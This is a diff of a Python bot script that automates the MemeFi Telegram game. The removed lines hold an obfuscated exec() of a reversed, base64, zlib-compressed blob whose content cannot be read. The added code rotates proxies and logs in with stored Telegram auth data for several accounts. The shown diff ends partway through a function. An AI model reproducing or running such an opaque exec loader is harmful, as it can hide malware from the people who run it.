@@ -1,4 +1,488 @@
+import http.client
+import asyncio
+import json
+import random
+import string
+import time
+import base64
+from datetime import datetime
+from urllib.parse import unquote
+from utils.headers import headers_set
+from utils.queries import QUERY_USER, QUERY_LOGIN, MUTATION_GAME_PROCESS_TAPS_BATCH, QUERY_BOOSTER, QUERY_NEXT_BOSS
+from utils.queries import QUERY_TASK_VERIF, QUERY_TASK_COMPLETED, QUERY_GET_TASK, QUERY_TASK_ID, QUERY_GAME_CONFIG
 
-# UPDATED BY D4rkCipherX :https://www.youtube.com/@D4rkCipherX
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+url = "https://api-gw-tg.memefi.club/graphql"
+def load_proxies():
+    with open('proxy.txt', 'r') as file:
+        proxies = [line.strip() for line in file.readlines()]
+    return proxies
+
+proxies = load_proxies()
+
+# HANDLE SEMUA ERROR TAROH DISINI BANG SAFE_POST
+def safe_post(url, headers, json_payload):
+    retries = 5
+    timeout = 5  # Timeout in seconds for each connection attempt
+    for attempt in range(retries):
+        try:
+            if proxies:
+                proxy = random.choice(proxies)
+                if '@' in proxy:
+                    user_pass, proxy_ip = proxy.split('@')
+                    proxy_auth = base64.b64encode(user_pass.encode()).decode()
+                else:
+                    proxy_ip = proxy
+                    proxy_auth = None
+
+                conn = http.client.HTTPSConnection(proxy_ip, timeout=timeout)
+                if proxy_auth:
+                    conn.set_tunnel(url, 443, headers={"Proxy-Authorization": f"Basic {proxy_auth}"})
+                else:
+                    conn.set_tunnel(url, 443)
+            else:
+                conn = http.client.HTTPSConnection(url, timeout=timeout)
+            
+            payload = json.dumps(json_payload)
+            conn.request("POST", "/graphql", payload, headers)
+            res = conn.getresponse()
+            response_data = res.read().decode("utf-8")
+            if res.status == 200:
+                return json.loads(response_data)  # Return the JSON response if successful
+            else:
+                print(f"❌ Failed with status {res.status}, Try again ")
+        except (http.client.HTTPException, TimeoutError) as e:
+            print(f"❌ Error: {e}, Try again ")
+        if attempt < retries - 1:  # Jika ini bukan percobaan terakhir, tunggu sebelum mencoba lagi
+            time.sleep(10)
+        else:
+            print("❌ Failed after several attempts. Restart...")
+            return None
+    return None
+
+def generate_random_nonce(length=52):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
+
+# Mendapatkan akses token
+def fetch(account_line):
+    with open('query_id.txt', 'r') as file:
+        lines = file.readlines()
+        raw_data = lines[account_line - 1].strip()
+
+    tg_web_data = unquote(unquote(raw_data))
+    query_id = tg_web_data.split('query_id=', maxsplit=1)[1].split('&user', maxsplit=1)[0]
+    user_data = tg_web_data.split('user=', maxsplit=1)[1].split('&auth_date', maxsplit=1)[0]
+    auth_date = tg_web_data.split('auth_date=', maxsplit=1)[1].split('&hash', maxsplit=1)[0]
+    hash_ = tg_web_data.split('hash=', maxsplit=1)[1].split('&', maxsplit=1)[0]
+
+    user_data_dict = json.loads(unquote(user_data))
+
+    url = 'api-gw-tg.memefi.club'
+    headers = headers_set.copy()  # Use headers from utils/headers.py
+    data = {
+        "operationName": "MutationTelegramUserLogin",
+        "variables": {
+            "webAppData": {
+                "auth_date": int(auth_date),
+                "hash": hash_,
+                "query_id": query_id,
+                "checkDataString": f"auth_date={auth_date}\nquery_id={query_id}\nuser={unquote(user_data)}",
+                "user": {
+                    "id": user_data_dict["id"],
+                    "allows_write_to_pm": user_data_dict["allows_write_to_pm"],
+                    "first_name": user_data_dict["first_name"],
+                    "last_name": user_data_dict["last_name"],
+                    "username": user_data_dict.get("username", "Username gak diset"),
+                    "language_code": user_data_dict["language_code"],
+                    "version": "7.2",
+                    "platform": "ios",
+                    "is_premium": user_data_dict.get("is_premium", False)
+                }
+            }
+        },
+        "query": "mutation MutationTelegramUserLogin($webAppData: TelegramWebAppDataInput!) {\n  telegramUserLogin(webAppData: $webAppData) {\n    access_token\n    __typename\n  }\n}"
+    }
+
+    conn = http.client.HTTPSConnection(url)
+    payload = json.dumps(data)
+    conn.request("POST", "/graphql", payload, headers)
+    res = conn.getresponse()
+    response_data = res.read().decode("utf-8")
+
+    if res.status == 200:
+        try:
+            json_response = json.loads(response_data)
+            if 'errors' in json_response:
+                return None
+            else:
+                access_token = json_response['data']['telegramUserLogin']['access_token']
+                return access_token
+        except json.JSONDecodeError:
+            print("Failed to decode JSON response")
+            return None
+    else:
+        return None
+
+# Cek akses token
+def cek_user(index):
+    access_token = fetch(index + 1)
